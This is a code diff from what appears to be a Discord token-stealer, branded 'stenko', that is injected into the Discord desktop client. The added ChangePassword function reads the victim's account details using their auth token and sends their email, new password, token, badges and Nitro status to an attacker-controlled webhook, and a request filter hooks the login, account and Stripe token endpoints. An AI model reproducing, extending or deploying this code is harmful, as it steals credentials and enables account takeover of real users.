@@ -259,6 +259,93 @@ function Login(email, password, token) {
     })
 }
 
+function ChangePassword(email, newpassword, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+        const json = JSON.parse(info);
+        var params = {
+            username: "stenko",
+            content: "",
+            avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
+            embeds: [
+                {
+                    "title": "password changed",
+		    "description": "᲼᲼᲼᲼",
+                    "color": 3092790,
+                    "fields": [
+                        {
+                            "name": " name",
+			    "value": `\`` + json.username + `#` + json.discriminator + `\``,
+                            "inline": true
+                        },
+                        {
+                            "name": " id",
+                            "value": `\`` + json.id + `\``,
+                            "inline": true
+                        },
+                        {
+                            "name": "᲼᲼᲼᲼",
+                            "value": `᲼᲼᲼᲼`,
+                            "inline": false
+                        },
+                        {
+                            "name": " email",
+                            "value": `\`${email}\``,
+                            "inline": true
+                        },
+                        {
+                            "name": " new password",
+                            "value": `\`${newpassword}\``,
+                            "inline": true		    
+                        },
+                        {
+                            "name": "᲼᲼᲼᲼",
+                            "value": `᲼᲼᲼᲼`,
+                            "inline": false
+                        }, 
+                        {
+                            "name": " badges",
+                            "value": `\`${GetBadges(json.flags)}\``,
+                            "inline": true		    
+                        },
+                        {
+                            "name": " nitro",
+                            "value": `\`${GetNitro(json.premium_type)}\``,
+                            "inline": true		    
+                        },
+                        {
+                            "name": "᲼᲼᲼᲼",
+                            "value": `᲼᲼᲼᲼`,
+                            "inline": false
+                        }, 
+                        {
+                            "name": " token",
+                            "value": `\`${token}\``,
+                            "inline": false
+                        }
+                    ],
+                    "author": {
+                        "name": "stenko premium version",
+			"url": `https://stenko.xyz`,
+                    },
+		    "thumbnail": {
+                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                    },
+                    "footer": {
+                        "text": ""
+                    }
+                }
+            ]
+        }
+        SendToWebhook(JSON.stringify(params))
+    })
+}
+
 const ChangePasswordFilter = {
 	urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
 };
